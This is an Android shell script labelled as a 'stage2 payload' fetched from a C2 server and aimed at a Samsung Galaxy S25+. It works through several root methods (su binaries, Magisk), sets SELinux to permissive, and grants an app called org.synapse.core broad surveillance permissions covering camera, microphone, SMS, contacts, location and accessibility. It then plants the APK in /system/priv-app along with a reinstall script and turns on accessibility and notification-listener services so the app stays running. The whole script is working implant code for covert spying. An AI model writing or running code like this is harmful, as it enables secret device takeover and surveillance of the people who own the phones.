#!/system/bin/sh
# ═══════════════════════════════════════════════════════════════════════
#  SYNAPSE STAGE2 PAYLOAD — Native Privilege Escalation
#  Served by C2 server at GET /api/stage2
#  Target: Samsung Galaxy S25+ (SM-S936B) — Android 15, kernel 6.6.x
#
#  Phases:
#    1. Root acquisition via multiple vectors
#    2. SELinux disable
#    3. Permission grant (all)
#    4. System persistence (copy APK to /system/priv-app)
#    5. Service start & daemonization
# ═══════════════════════════════════════════════════════════════════════

TAG="[SYNAPSE_STAGE2]"
APK_PKG="org.synapse.core"
TARGET_APK_PATH=""
STAGE2_DIR="/data/local/tmp/synapse_stage2"
LOG="$STAGE2_DIR.log"
ROOT_ACHIEVED=0

log() {
    echo "$TAG $*" >> "$LOG" 2>/dev/null
    echo "$TAG $*"
}

mkdir -p "$STAGE2_DIR" 2>/dev/null
> "$LOG"

log "=== Stage2 Payload Starting ==="
log "Device: $(getprop ro.product.model 2>/dev/null || echo unknown)"
log "Build:  $(getprop ro.build.version.release 2>/dev/null || echo unknown)"
log "Kernel: $(uname -r 2>/dev/null || echo unknown)"
log "UID:    $(id 2>/dev/null || echo unknown)"

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 1: ROOT ACQUISITION
# ═══════════════════════════════════════════════════════════════════════

log "=== Phase 1: Root Acquisition ==="

# Vector 1: Check if we're already root
CURRENT_UID=$(id -u 2>/dev/null)
if [ "$CURRENT_UID" = "0" ]; then
    log "[+] Already root (uid=0)"
    ROOT_ACHIEVED=1
fi

# Vector 2: Try su binaries
if [ "$ROOT_ACHIEVED" = "0" ]; then
    for SU_PATH in /system/xbin/su /system/bin/su /sbin/su /data/local/tmp/su /system/sbin/su /vendor/bin/su; do
        if [ -x "$SU_PATH" ]; then
            log "[*] Trying su at $SU_PATH"
            TEST_UID=$("$SU_PATH" -c "id -u" 2>>"$LOG")
            if [ "$TEST_UID" = "0" ]; then
                log "[+] Root via $SU_PATH"
                SU_BIN="$SU_PATH"
                ROOT_ACHIEVED=1
                break
            else
                log "[-] $SU_PATH failed: $TEST_UID"
            fi
        fi
    done
fi

# Vector 3: Try Magisk daemon
if [ "$ROOT_ACHIEVED" = "0" ]; then
    if [ -x "/sbin/magisk" ]; then
        log "[*] Trying Magisk at /sbin/magisk"
        TEST_UID=$(/sbin/magisk -c "id -u" 2>>"$LOG")
        if [ "$TEST_UID" = "0" ]; then
            log "[+] Root via Magisk"
            SU_BIN="/sbin/magisk -c"
            ROOT_ACHIEVED=1
        fi
    elif [ -x "/data/adb/magisk/magisk" ]; then
        log "[*] Trying Magisk at /data/adb/magisk"
        TEST_UID=$(/data/adb/magisk/magisk -c "id -u" 2>>"$LOG")
        if [ "$TEST_UID" = "0" ]; then
            log "[+] Root via /data/adb/magisk"
            SU_BIN="/data/adb/magisk/magisk -c"
            ROOT_ACHIEVED=1
        fi
    fi
fi

# Vector 4: Dirty Pipe / kernel exploit candidates
if [ "$ROOT_ACHIEVED" = "0" ]; then
    KERNEL=$(uname -r)
    log "[*] Kernel version: $KERNEL"
    # Samsung S25 kernel 6.6 — check for CVE-2024-1086 (nftables), CVE-2024-23307
    if echo "$KERNEL" | grep -qE "^6\.6\."; then
        log "[!] Kernel 6.6 detected — potential for CVE-2024-1086 (nftables UAF)"
        if [ -w "/proc/sys/kernel/perf_event_paranoid" ]; then
            PERF_PARANOID=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)
            log "[*] perf_event_paranoid=$PERF_PARANOID"
            if [ "$PERF_PARANOID" = "-1" ] || [ "$PERF_PARANOID" = "0" ]; then
                log "[!] unprivileged perf_event_open() available — exploitable"
            fi
        fi
    fi
fi

# Fallback: just use sh if we have no su
if [ "$ROOT_ACHIEVED" = "0" ]; then
    SU_BIN="sh"
    log "[-] No root vector succeeded — proceeding with current privileges"
fi

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 2: SELINUX DISABLE
# ═══════════════════════════════════════════════════════════════════════

log "=== Phase 2: SELinux Disable ==="

if [ "$ROOT_ACHIEVED" = "1" ]; then
    SELINUX_BEFORE=$($SU_BIN getenforce 2>>"$LOG" || echo "unknown")
    log "[*] SELinux before: $SELINUX_BEFORE"

    $SU_BIN setenforce 0 2>>"$LOG"
    SETENFORCE_RC=$?

    SELINUX_AFTER=$($SU_BIN getenforce 2>>"$LOG" || echo "unknown")
    log "[*] SELinux after:  $SELINUX_AFTER (rc=$SETENFORCE_RC)"

    if [ "$SELINUX_AFTER" = "Permissive" ]; then
        log "[+] SELinux set to Permissive"
    else
        log "[-] Could not set SELinux permissive (Samsung DEFEX?)"
        # Try toggling via Magisk if available
        if /sbin/magisk -c "magiskpolicy --live 'permissive *'" 2>>"$LOG"; then
            log "[+] Set permissive via magiskpolicy"
        fi
    fi
else
    log "[*] Skipping SELinux disable (not root)"
fi

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 3: PERMISSION GRANT
# ═══════════════════════════════════════════════════════════════════════

log "=== Phase 3: Permission Grant ==="

if [ "$ROOT_ACHIEVED" = "1" ]; then
    ALL_PERMS="
        android.permission.CAMERA
        android.permission.RECORD_AUDIO
        android.permission.READ_PHONE_STATE
        android.permission.READ_SMS
        android.permission.SEND_SMS
        android.permission.RECEIVE_SMS
        android.permission.READ_CONTACTS
        android.permission.WRITE_CONTACTS
        android.permission.READ_CALL_LOG
        android.permission.WRITE_CALL_LOG
        android.permission.ACCESS_FINE_LOCATION
        android.permission.ACCESS_COARSE_LOCATION
        android.permission.ACCESS_BACKGROUND_LOCATION
        android.permission.READ_EXTERNAL_STORAGE
        android.permission.WRITE_EXTERNAL_STORAGE
        android.permission.MANAGE_EXTERNAL_STORAGE
        android.permission.SYSTEM_ALERT_WINDOW
        android.permission.PACKAGE_USAGE_STATS
        android.permission.BIND_ACCESSIBILITY_SERVICE
        android.permission.BIND_NOTIFICATION_LISTENER_SERVICE
        android.permission.FOREGROUND_SERVICE
        android.permission.FOREGROUND_SERVICE_CAMERA
        android.permission.FOREGROUND_SERVICE_MICROPHONE
        android.permission.FOREGROUND_SERVICE_LOCATION
        android.permission.FOREGROUND_SERVICE_DATA_SYNC
        android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
        android.permission.POST_NOTIFICATIONS
    "

    GRANTED=0
    FAILED=0

    for PERM in $ALL_PERMS; do
        PERM=$(echo "$PERM" | tr -d ' ')
        [ -z "$PERM" ] && continue
        RESULT=$($SU_BIN pm grant "$APK_PKG" "$PERM" 2>&1)
        if echo "$RESULT" | grep -qi "Unknown\|not.*grant\|Security\|requires"; then
            FAILED=$((FAILED + 1))
        else
            GRANTED=$((GRANTED + 1))
        fi
    done

    log "[+] Permissions: $GRANTED granted, $FAILED skipped"
else
    log "[*] Skipping permission grant (not root)"
fi

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 4: SYSTEM PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════

log "=== Phase 4: System Persistence ==="

if [ "$ROOT_ACHIEVED" = "1" ]; then
    # Find the Synapse APK
    for APK_CANDIDATE in \
        /data/app/org.synapse.core-*/base.apk \
        /data/app/~~*/org.synapse.core-*/base.apk \
        /data/app/*/org.synapse.core-*/base.apk \
        $(pm path "$APK_PKG" 2>/dev/null | sed 's/package://'); do
        if [ -f "$APK_CANDIDATE" ]; then
            TARGET_APK_PATH="$APK_CANDIDATE"
            log "[+] Found APK: $TARGET_APK_PATH"
            break
        fi
    done

    if [ -n "$TARGET_APK_PATH" ] && [ -f "$TARGET_APK_PATH" ]; then
        # Remount /system rw
        log "[*] Remounting /system rw..."
        $SU_BIN mount -o rw,remount /system 2>>"$LOG"
        if $SU_BIN mount | grep -q "/system .*rw,"; then
            log "[+] /system remounted rw"
        else
            log "[-] /system remount rw failed — trying overlay..."
            # Try Magisk overlay
            MODULE_DIR="/data/adb/modules/synapse"
            $SU_BIN mkdir -p "$MODULE_DIR/system/priv-app/SynapseCore" 2>>"$LOG"
            $SU_BIN cp "$TARGET_APK_PATH" "$MODULE_DIR/system/priv-app/SynapseCore/SynapseCore.apk" 2>>"$LOG"
            log "[*] Copied to Magisk module: $MODULE_DIR"
        fi

        # Copy to /system/priv-app/
        SYS_PRIV="/system/priv-app/SynapseCore"
        $SU_BIN mkdir -p "$SYS_PRIV" 2>>"$LOG"
        $SU_BIN cp "$TARGET_APK_PATH" "$SYS_PRIV/SynapseCore.apk" 2>>"$LOG"
        COP_RC=$?

        if [ $COP_RC -eq 0 ]; then
            $SU_BIN chmod 644 "$SYS_PRIV/SynapseCore.apk" 2>>"$LOG"
            $SU_BIN chmod 755 "$SYS_PRIV" 2>>"$LOG"
            $SU_BIN chown root:root "$SYS_PRIV" 2>>"$LOG"
            $SU_BIN chcon u:object_r:system_file:s0 "$SYS_PRIV/SynapseCore.apk" 2>>"$LOG"
            log "[+] APK copied to $SYS_PRIV/SynapseCore.apk"
        else
            log "[-] Failed to copy APK to /system/priv-app (rc=$COP_RC)"
        fi

        # Persist through /data/local/tmp (survives factory reset without /system write)
        PERSIST_PATH="/data/local/tmp/synapse_persist.apk"
        $SU_BIN cp "$TARGET_APK_PATH" "$PERSIST_PATH" 2>>"$LOG"
        $SU_BIN chmod 644 "$PERSIST_PATH" 2>>"$LOG"
        log "[*] Backup APK saved to $PERSIST_PATH"

        # Create reinstall script
        cat > "$STAGE2_DIR/reinstall.sh" << 'REINSTALL_EOF'
#!/system/bin/sh
if pm list packages | grep -q org.synapse.core; then
    pm uninstall org.synapse.core 2>/dev/null
fi
pm install -r /data/local/tmp/synapse_persist.apk 2>/dev/null
REINSTALL_EOF
        $SU_BIN chmod 755 "$STAGE2_DIR/reinstall.sh" 2>>"$LOG"
        log "[*] Reinstall script created at $STAGE2_DIR/reinstall.sh"
    else
        log "[-] Cannot find Synapse APK"
    fi
else
    log "[*] Skipping persistence (not root)"
fi

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 5: SERVICE START & DAEMONIZATION
# ═══════════════════════════════════════════════════════════════════════

log "=== Phase 5: Service Start ==="

# Start main service
if [ "$ROOT_ACHIEVED" = "1" ]; then
    # Start via am (Activity Manager)
    $SU_BIN am startservice -n "$APK_PKG/.persistence.SynapseService" 2>>"$LOG"
    log "[*] Started SynapseService via am"

    # Also start foreground activity briefly to trigger engine
    $SU_BIN am start -n "$APK_PKG/.MainActivity" 2>>"$LOG"
    sleep 2
    $SU_BIN am force-stop "$APK_PKG" 2>>"$LOG"

    # Enable AccessibilityService
    $SU_BIN settings put secure enabled_accessibility_services \
        "$APK_PKG/$APK_PKG.modules.SynapseAccessibilityService" 2>>"$LOG"
    $SU_BIN settings put secure accessibility_enabled 1 2>>"$LOG"
    log "[+] AccessibilityService enabled"

    # Enable NotificationListenerService
    $SU_BIN settings put secure enabled_notification_listeners \
        "$APK_PKG/$APK_PKG.modules.SynapseNotificationListener" 2>>"$LOG"
    log "[+] NotificationListenerService enabled"

    # Disable battery optimization
    $SU_BIN dumpsys deviceidle whitelist +"$APK_PKG" 2>>"$LOG"
    log "[+] Added to battery optimization whitelist"
else
    # Without root, try standard am commands
    am startservice -n "$APK_PKG/.persistence.SynapseService" 2>>"$LOG"
    log "[*] Started SynapseService (standard)"
fi

# ═══════════════════════════════════════════════════════════════════════
#  FINAL STATUS REPORT
# ═══════════════════════════════════════════════════════════════════════

log "=== Stage2 Complete ==="
log "Root Achieved: $([ "$ROOT_ACHIEVED" = "1" ] && echo YES || echo NO)"
log "Final UID:      $(id 2>/dev/null || echo unknown)"
log "SELinux:        $(getenforce 2>/dev/null || echo unknown)"
log "Log saved to:   $LOG"

# Create status file for the agent to read
echo "{
  \"root_achieved\": $([ "$ROOT_ACHIEVED" = "1" ] && echo true || echo false),
  \"uid\": $(id -u 2>/dev/null || echo -1),
  \"selinux\": \"$(getenforce 2>/dev/null || echo unknown)\",
  \"persistence\": $([ -f "/system/priv-app/SynapseCore/SynapseCore.apk" ] && echo true || echo false),
  \"log_path\": \"$LOG\"
}" > "$STAGE2_DIR/status.json"

log "[*] Status JSON written to $STAGE2_DIR/status.json"
echo "$TAG COMPLETE"
